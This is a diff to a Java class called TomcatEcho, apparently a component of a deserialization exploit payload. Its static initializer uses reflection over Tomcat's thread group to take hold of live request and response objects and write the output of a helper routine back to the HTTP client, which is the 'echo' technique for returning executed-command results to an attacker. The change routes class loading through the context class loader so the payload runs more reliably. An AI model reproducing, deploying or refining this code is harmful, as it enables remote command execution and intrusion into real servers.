@@ -9,9 +9,10 @@ public class TomcatEcho {
 
 	static {
 		try {
-			boolean                 flag  = false;
-			ThreadGroup             group = Thread.currentThread().getThreadGroup();
-			java.lang.reflect.Field f     = group.getClass().getDeclaredField("threads");
+			boolean                 flag   = false;
+			ThreadGroup             group  = Thread.currentThread().getThreadGroup();
+			ClassLoader             loader = Thread.currentThread().getContextClassLoader();
+			java.lang.reflect.Field f      = group.getClass().getDeclaredField("threads");
 			f.setAccessible(true);
 			Thread[] threads = (Thread[]) f.get(group);
 			for (int i = 0; i < threads.length; i++) {
@@ -55,12 +56,12 @@ public class TomcatEcho {
 							resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Integer(200));
 							java.io.ByteArrayOutputStream baos = q(str);
 							try {
-								Class cls = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
+								Class cls = Class.forName("org.apache.tomcat.util.buf.ByteChunk", false, loader);
 								obj = cls.newInstance();
 								cls.getDeclaredMethod("setBytes", new Class[]{byte[].class, int.class, int.class}).invoke(obj, baos.toByteArray(), new Integer(0), baos.toByteArray().length);
 								resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, obj);
 							} catch (NoSuchMethodException var5) {
-								Class cls = Class.forName("java.nio.ByteBuffer");
+								Class cls = Class.forName("java.nio.ByteBuffer", false, loader);
 								obj = cls.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(cls, new Object[]{baos.toByteArray()});
 								resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, obj);
 							}
